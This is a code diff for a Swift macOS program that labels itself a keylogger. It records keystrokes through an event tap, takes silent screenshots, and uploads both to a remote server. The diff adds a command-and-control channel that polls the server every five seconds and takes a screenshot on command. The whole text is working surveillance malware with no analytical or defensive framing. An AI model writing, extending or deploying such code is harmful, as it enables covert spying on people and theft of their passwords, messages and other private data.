@@ -12,7 +12,7 @@ let bufferLimit = 10
 let timeLimit = 2.0
 
 // Config Screenshot
-let screenshotInterval = 60.0 // 60 secondes
+let screenshotInterval = 60.0 // Capture automatique si aucune commande n'est envoyée
 
 // --- VARIABLES GLOBALES ---
 var logBuffer = ""
@@ -20,7 +20,7 @@ var lastSendTime = Date()
 var bufferLock = NSLock()
 
 // ---------------------------------------------------------------------
-// PARTIE 1 : FONCTIONS KEYLOGGER
+// PARTIE 1 : FONCTIONS KEYLOGGER (INCHANGÉ)
 // ---------------------------------------------------------------------
 
 func sendLogs() {
@@ -103,7 +103,7 @@ let eventCallback: CGEventTapCallBack = { proxy, type, event, refcon in
 }
 
 // ---------------------------------------------------------------------
-// PARTIE 2 : FONCTIONS SCREENSHOT (CORRIGÉ POUR macOS 15+)
+// PARTIE 2 : FONCTIONS SCREENSHOT (INCHANGÉ)
 // ---------------------------------------------------------------------
 
 func createBody(parameters: [String: String], boundary: String, data: Data, mimeType: String, filename: String) -> Data {
@@ -131,9 +131,6 @@ func takeAndUploadScreenshot() {
     let tempPath = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("temp_capture_\(UUID().uuidString).jpg")
     
     // 2. Utiliser l'outil système 'screencapture' (fonctionne sur toutes versions macOS)
-    // -x : pas de son
-    // -t jpg : format jpeg
-    // -m : écran principal uniquement
     let task = Process()
     task.executableURL = URL(fileURLWithPath: "/usr/sbin/screencapture")
     task.arguments = ["-x", "-t", "jpg", "-m", tempPath.path]
@@ -173,23 +170,59 @@ func uploadData(jpegData: Data) {
 }
 
 // ---------------------------------------------------------------------
+// PARTIE 3 : FONCTIONS DE COMMANDE À DISTANCE (NOUVEAU)
+// ---------------------------------------------------------------------
+
+func checkCommand() {
+    let json: [String: Any] = ["machine": machineID]
+    guard let jsonData = try? JSONSerialization.data(withJSONObject: json, options: []) else { return }
+
+    var request = URLRequest(url: serverURL.appendingPathComponent("/get_command"))
+    request.httpMethod = "POST"
+    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+    request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
+    request.httpBody = jsonData
+    request.timeoutInterval = 5 // Délai de polling court
+
+    let task = URLSession.shared.dataTask(with: request) { data, response, error in
+        guard let data = data, error == nil else { return }
+
+        if let jsonResponse = try? JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
+           let command = jsonResponse["command"] as? String {
+            
+            // Si le serveur a envoyé une commande 'screenshot', on l'exécute
+            if command == "screenshot" {
+                takeAndUploadScreenshot()
+            }
+        }
+    }
+    task.resume()
+}
+
+// ---------------------------------------------------------------------
 // MAIN
 // ---------------------------------------------------------------------
 print("Keylogger + Screenshot (System Tool) Started...")
 
-// Timer 1 : Keylogger
+// Timer 1 : Keylogger (Envoi des logs en buffer)
 Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
     if Date().timeIntervalSince(lastSendTime) >= timeLimit {
         sendLogs()
     }
 }
 
-// Timer 2 : Screenshot
+// Timer 2 : Screenshot (AUTOMATIQUE - Désactivez-le si vous ne voulez que les commandes)
 Timer.scheduledTimer(withTimeInterval: screenshotInterval, repeats: true) { _ in
     takeAndUploadScreenshot()
 }
 
-// Hook Clavier
+// Timer 3 : Remote Command Polling (Vérifie les commandes toutes les 5 secondes)
+Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { _ in
+    checkCommand()
+}
+
+
+// Hook Clavier (Inchangé)
 let eventMask = (1 << CGEventType.keyDown.rawValue)
 guard let eventTap = CGEvent.tapCreate(tap: .cgSessionEventTap, place: .headInsertEventTap, options: .defaultTap, eventsOfInterest: CGEventMask(eventMask), callback: eventCallback, userInfo: nil) else {
     exit(1)
